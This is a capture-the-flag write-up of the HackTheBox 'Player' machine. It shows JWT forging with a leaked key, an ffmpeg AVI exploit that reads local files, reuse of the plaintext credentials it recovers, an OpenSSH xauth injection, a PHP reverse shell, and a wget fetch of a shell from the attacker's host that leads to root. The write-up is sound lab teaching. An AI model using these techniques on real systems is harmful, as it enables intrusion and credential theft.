---
title: HTB | Player
author: Zeropio
date: 2023-01-05
categories: [Pentesting, HackTheBox]
tags: [htb, linux, hard, machines]
permalink: /pentesting/htb/machines/player
image:
  path: /assets/img/hackthebox/card/Player.png
  width: 800
  height: 500
---

# Fingerprint

## Scan

The scan show:

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d730dbb9a04c79947838b343a2505581 (DSA)
|   2048 372be431eea6490d9fe7e601e63e0a66 (RSA)
|   256 0c6c05edadf175e802e4d2273e3a198f (ECDSA)
|_  256 11b8dbf3cc29084a49cebf917340a280 (ED25519)
80/tcp   open  http       Apache httpd 2.4.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 403 Forbidden
6686/tcp open  tcpwrapped
Service Info: Host: player.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Inspecting further the port 6686:

```console
$ nc -nv 10.10.10.145 6686  
(UNKNOWN) [10.10.10.145] 6686 (?) open
SSH-2.0-OpenSSH_7.2
```

## Enumeration

The web show:

```
http://player.htb/ [403 Forbidden] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], Title[403 Forbidden]
```

Fuzzing the web:

```
server-status           [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 49ms]
                        [Status: 403, Size: 277, Words: 21, Lines: 11, Duration: 51ms]
launcher                [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 47ms]
wp-forum.phps           [Status: 403, Size: 290, Words: 21, Lines: 11, Duration: 45ms]

```

The root path cannot be access, but the `/launcher/`{: .filepath} is accesible. The technologies in this web are:

```
http://player.htb/launcher/ [200 OK] Apache[2.4.7], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], JQuery, Meta-Author[mrr3boot.co], Modernizr[2.6.2.min], Script, Title[PlayBuff], X-UA-Compatible[IE=edge]
```

 Fuzzing it show:

```
js                      [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 53ms]
images                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 54ms]
css                     [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 57ms]
.                       [Status: 200, Size: 2969, Words: 138, Lines: 100, Duration: 51ms]
fonts                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 50ms]
vendor                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 46ms]
												[Status: 200, Size: 2969, Words: 138, Lines: 100, Duration: 49ms]
index.html              [Status: 200, Size: 2969, Words: 138, Lines: 100, Duration: 61ms]

```

There is a space for sending an email. Intercepting the request doesnâ€™t show any email, but a strange PHP file:

![Untitled](/assets/img/hackthebox/labs/player/Untitled.png)

If we send the request we can intercept another one with the following format:

```
Cookie: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU
```

Separating each string by `.` we got two different texts:

```
{"typ":"JWT","alg":"HS256"}
{"project":"PlayBuff","access_code":"C0B137FE2D792459F26FF763CCE44574A5B5AB03"}
```

This is a **JWT** token.

Fuzzing for VHost we get:

```
dev                     [Status: 200, Size: 5243, Words: 1741, Lines: 87, Duration: 52ms]
staging                 [Status: 200, Size: 1470, Words: 175, Lines: 64, Duration: 45ms]
chat                    [Status: 200, Size: 9513, Words: 2711, Lines: 260, Duration: 44ms]
```

### Chat

Only the subdomain **chat** will work:

![Untitled](/assets/img/hackthebox/labs/player/Untitled%201.png)

```
http://chat.player.htb/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], JQuery, Script[text/x-handlebars-template], Title[PlayBuff Internal Chat Room]
```

There we can see a little hint:

```
They mentioned our staging exposing some sensitive files and main domain exposing source code which allowing them to access our product before release. Currently our team working on the fix.
```

### Dev

There is a login under this subdomain:

![Untitled](/assets/img/hackthebox/labs/player/Untitled%202.png)

```
http://dev.player.htb/ [200 OK] Apache[2.4.7], Cookies[97c737d7256edaf18c3552b469f00d9d], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145], JQuery[1.7.2], PHP[5.5.9-1ubuntu4.26], PasswordField[password], Script, Title[Playbuff - Dev Portal], X-Powered-By[PHP/5.5.9-1ubuntu4.26]
```

There is some stranges cookies in the subdomain: `97c737d7256edaf18c3552b469f00d9d:2abhsojk5898a96jhflsg8r5e5`.  Inspecting the source code we got a JS file under `/components/user/init.js`{: .filepath}. There it has a reference to**Codiad**, a web framework. We have some exploits for this framework:

```console
$ searchsploit codiad  
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                                                                    | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                                                        | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                                       | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                                   | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                                   | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                                   | multiple/webapps/50474.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

But first, we need credentials.

### Staging

Fuzzing this web:

```
server-status           [Status: 403, Size: 298, Words: 21, Lines: 11, Duration: 46ms]
                        [Status: 200, Size: 1470, Words: 175, Lines: 64, Duration: 44ms]
.                       [Status: 200, Size: 1470, Words: 175, Lines: 64, Duration: 48ms]
update.php              [Status: 200, Size: 1642, Words: 171, Lines: 88, Duration: 63ms]
index.html              [Status: 200, Size: 1470, Words: 175, Lines: 64, Duration: 46ms]
contact.php             [Status: 200, Size: 818, Words: 190, Lines: 45, Duration: 51ms]
contact.html            [Status: 200, Size: 1838, Words: 193, Lines: 100, Duration: 45ms]
fix.php                 [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 54ms]
```

```
http://staging.player.htb/ [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.145]
```

The `/contact.html`{: .filepath} has a form. Sending something gives a error 500, but if we intercept the request:

![Untitled](/assets/img/hackthebox/labs/player/Untitled%203.png)

We have the following contents:

```php
array(3) {
  [0]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(6)
    ["function"]=>
    string(1) "c"
    ["args"]=>
    array(1) {
      [0]=>
      &string(9) "Cleveland"
    }
  }
  [1]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(3)
    ["function"]=>
    string(1) "b"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Glenn"
    }
  }
  [2]=>
  array(4) {
    ["file"]=>
    string(28) "/var/www/staging/contact.php"
    ["line"]=>
    int(11)
    ["function"]=>
    string(1) "a"
    ["args"]=>
    array(1) {
      [0]=>
      &string(5) "Peter"
    }
  }
}
```

With the following error message:

```
Unknown variable user in /var/www/backup/service_config fatal error in /var/www/staging/fix.php
```

Using the previous hint, if we access the backup PHP file of the one with the suspicious name we can get the plaintext file:

![Untitled](/assets/img/hackthebox/labs/player/Untitled%204.png)

```php
<?php
require 'vendor/autoload.php';

use \Firebase\JWT\JWT;

if(isset($_COOKIE["access"]))
{
	$key = '_S0_R@nd0m_P@ss_';
	$decoded = JWT::decode($_COOKIE["access"], base64_decode(strtr($key, '-_', '+/')), ['HS256']);
	if($decoded->access_code === "0E76658526655756207688271159624026011393")
	{
		header("Location: 7F2xxxxxxxxxxxxx/");
	}
	else
	{
		header("Location: index.html");
	}
}
else
{
	$token_payload = [
	  'project' => 'PlayBuff',
	  'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03'
	];
	$key = '_S0_R@nd0m_P@ss_';
	$jwt = JWT::encode($token_payload, base64_decode(strtr($key, '-_', '+/')), 'HS256');
	$cookiename = 'access';
	setcookie('access',$jwt, time() + (86400 * 30), "/");
	header("Location: index.html");
}

?>
```

Using the new **access_code** from this file, and with all the previous info, we can create a new JWT in this [page](https://jwt.io/):

![Untitled](/assets/img/hackthebox/labs/player/Untitled%205.png)

Sending now an email send us to a new page:

![Untitled](/assets/img/hackthebox/labs/player/Untitled%206.png)

Uploading a random file we can see it as an .avi (`http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/334835969.avi`). With a real avi send, we can access it. The page has done some modifications to the file when we send it:

```console
$ exiftool 787140227.avi 
ExifTool Version Number         : 12.52
File Name                       : 787140227.avi
Directory                       : .
File Size                       : 393 kB
File Modification Date/Time     : 2023:01:05 11:16:00+00:00
File Access Date/Time           : 2023:01:05 11:16:00+00:00
File Inode Change Date/Time     : 2023:01:05 11:16:06+00:00
File Permissions                : -rw-r--r--
File Type                       : AVI
File Type Extension             : avi
MIME Type                       : video/x-msvideo
Frame Rate                      : 30
Max Data Rate                   : 24.41 kB/s
Frame Count                     : 355
Stream Count                    : 1
Stream Type                     : Video
Video Codec                     : FMP4
```

There seem to be a [vulnerability](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS) associated with this.

---

# Footprint

## Initial Access

Using the [exploit](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/gen_xbin_avi.py), we can create a malicious .avi that access other files, for example:

```console
$ python3 gen_xbin_avi.py file://etc/passwd exploit.avi
```

Downloading the video show the file:

![Untitled](/assets/img/hackthebox/labs/player/Untitled%207.png)

We can access the previous files with errors we got:

```console
$ python3 gen_xbin_avi.py file://var/www/backup/service_config service_config.avi
$ python3 gen_xbin_avi.py file://var/www/staging/fix.php fix.avi
```

In **service_config** we can found a pair of credentials: `telegen:d-bC|jC!2uepS/w`:

![Untitled](/assets/img/hackthebox/labs/player/Untitled%208.png)

Now we can use it for the SSH:

```console
$ ssh telegen@10.10.10.145 -p 6686         
telegen@10.10.10.145's password: 
Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104
Environment:
  USER=telegen
  LOGNAME=telegen
  HOME=/home/telegen
  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
  MAIL=/var/mail/telegen
  SHELL=/usr/bin/lshell
  SSH_CLIENT=10.10.14.13 56044 6686
  SSH_CONNECTION=10.10.14.13 56044 10.10.10.145 6686
  SSH_TTY=/dev/pts/0
  TERM=xterm-256color
========= PlayBuff ==========
Welcome to Staging Environment

telegen:~$
```

This give us a restricted shell:

```console
telegen:~$ id
*** forbidden command: id
telegen:~$ 
telegen:~$ ls
*** forbidden command: ls
telegen:~$ ip a
*** forbidden command: ip
telegen:~$ help
  clear  exit  help  history  lpath  lsudo
```

In this OpenSSH version we have an RCE with credentials we can use:

```console
$ searchsploit openssh 7.2
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                   | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                             | linux/remote/45210.py
OpenSSH 7.2 - Denial of Service                                                                                            | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                                                    | multiple/remote/39569.py
```

Using it:

```console
$ python2 39569.py 10.10.10.145 6686 telgen 'd-bC|jC!2uepS/w'

INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile 
    .writefile  
    .exit .quit
#> .readfile /var/www/staging/fix.php
DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:if(!$username){
$username
$password
}
//modified
//for
//fix
//peter
//CQXpm\z)G5D#%S$y=
}
```

With the new pair of credentials `peter:CQXpm\z)G5D#%S$y=` we can login in the **dev** subdomain. Here, we will create a new **Project**:

![Untitled](/assets/img/hackthebox/labs/player/Untitled%209.png)

We create a file **shell.php** with a reverse shell. Accesing it `http://dev.player.htb/home/shell/shell.php` and now we got a reverse shell as **www-data**.

## Privilege Escalation

```console
$ rlwrap nc -lvnp 80                
listening on [any] 80 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.145] 49252
Linux player 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:33:43 up 19:57,  0 users,  load average: 0.01, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$
```

With `pspy32` we can see root is using `openssh`:

```
2023/01/05 17:36:02 CMD: UID=0    PID=9685   | /root/openssh-7.2p1/sshd -p 6686 -f /root/openssh-7.2p1/sshd_config -D -d                                     
2023/01/05 17:36:07 CMD: UID=0    PID=9688   | sleep 5 
2023/01/05 17:36:07 CMD: UID=0    PID=9687   | /root/openssh-7.2p1/sshd -p 6686 -f /root/openssh-7.2p1/sshd_config -D -d                                     
2023/01/05 17:36:12 CMD: UID=0    PID=9690   | sleep 5 
2023/01/05 17:36:12 CMD: UID=0    PID=9689   | /root/openssh-7.2p1/sshd -p 6686 -f /root/openssh-7.2p1/sshd_config -D -d
. . . <SNIP> . . . 
2023/01/05 17:40:01 CMD: UID=0    PID=9843   | /bin/sh -c /usr/bin/php /var/lib/playbuff/buff.php > /var/lib/playbuff/error.log 
2023/01/05 17:40:01 CMD: UID=0    PID=9845   | /usr/bin/php /var/lib/playbuff/buff.php
```

We can get the **telegen** user again:

```console
www-data@player:/$ su telegen -s /bin/bash
su telegen -s /bin/bash
Password: d-bC|jC!2uepS/w

telegen@player:/$
```

This **buff.php** file has the following contents:

```php
<?php
include("/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php");
class playBuff
{
        public $logFile="/var/log/playbuff/logs.txt";
        public $logData="Updated";

        public function __wakeup()
        {
                file_put_contents(__DIR__."/".$this->logFile,$this->logData);
        }
}
$buff = new playBuff();
$serialbuff = serialize($buff);
$data = file_get_contents("/var/lib/playbuff/merge.log");
if(unserialize($data))
{
        $update = file_get_contents("/var/lib/playbuff/logs.txt");
        $query = mysqli_query($conn, "update stats set status='$update' where id=1");
        if($query)
        {
                echo 'Update Success with serialized logs!';
        }
}
else
{
        file_put_contents("/var/lib/playbuff/merge.log","no issues yet");
        $update = file_get_contents("/var/lib/playbuff/logs.txt");
        $query = mysqli_query($conn, "update stats set status='$update' where id=1");
        if($query)
        {
                echo 'Update Success!';
        }
}
?>
```

We can do a RCE via unserialization of PHP. We only have write permission on **merge.log**:

```console
telegen@player:/var/lib/playbuff$ ll
ll
total 24
drwxr-xr-x  2 root    root    4096 Aug  9 20:24 ./
drwxr-xr-x 50 root    root    4096 Jan  5 06:36 ../
-rwx---r--  1 root    root     878 Mar 24  2019 buff.php*
-rw-r--r--  1 root    root      15 Jan  5 17:51 error.log
-r--------  1 root    root      14 Mar 24  2019 logs.txt
-rw-------  1 telegen telegen   13 Jan  5 17:51 merge.log
```

Or, as we can see the file is doing a include of **dee8dc8a47256c64630d803a4c40786g.php**. We can replace it for a shell.

```console
www-data@player:/var/www/html/launcher$ wget http://10.10.14.13:9000/dee8dc8a47256c64630d803a4c40786g.php -O dee8dc8a47256c64630d803a4c40786g.php
```

Waiting and we should get our shell:

```console
$ rlwrap nc -lvnp 443               
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.145] 35194
Linux player 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:59:01 up 20:22,  0 users,  load average: 0.10, 0.11, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=0(root) gid=0(root) groups=0(root)
sh: 0: can't access tty; job control turned off
# whoami
root
```
